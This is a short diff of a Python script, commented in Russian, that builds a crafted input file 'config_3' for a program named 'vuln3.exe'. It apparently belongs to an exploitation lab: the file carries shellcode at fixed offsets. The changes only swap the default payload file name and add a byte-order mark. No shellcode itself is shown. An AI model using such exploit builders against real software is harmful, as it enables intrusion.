@@ -1,4 +1,4 @@
-"""Сборка файла config_3 для vuln3.exe.
+﻿"""Сборка файла config_3 для vuln3.exe.
 
 Формат config_3 (всё little-endian):
 
@@ -14,7 +14,7 @@
 Итоговый размер = 54 + 2516 + 4 + len(shellcode).
 
 Использование:
-    python make_config.py payload_c.bin config_3
+    python make_config.py payload_asm.bin config_3
 """
 import struct
 import sys
@@ -44,7 +44,7 @@ def build(code: bytes) -> bytes:
 
 
 if __name__ == '__main__':
-    src = sys.argv[1] if len(sys.argv) > 1 else 'payload_c.bin'
+    src = sys.argv[1] if len(sys.argv) > 1 else 'payload_asm.bin'
     dst = sys.argv[2] if len(sys.argv) > 2 else 'config_3'
     code = open(src, 'rb').read()
     cfg = build(code)
